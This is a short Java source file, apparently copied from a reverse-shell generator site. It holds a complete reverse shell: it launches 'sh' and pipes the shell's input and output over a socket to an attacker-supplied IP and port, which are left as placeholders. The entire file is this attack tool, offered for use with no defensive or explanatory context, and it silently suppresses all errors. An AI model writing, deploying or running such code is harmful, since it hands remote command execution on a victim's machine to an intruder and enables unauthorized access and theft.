import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
// taken from https://www.revshells.com/
public class shell {
    public static void main(String[] args) {
        String host = "ENTER IP HERE";
        int port = PORT_HERE;
        String cmd = "sh";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}
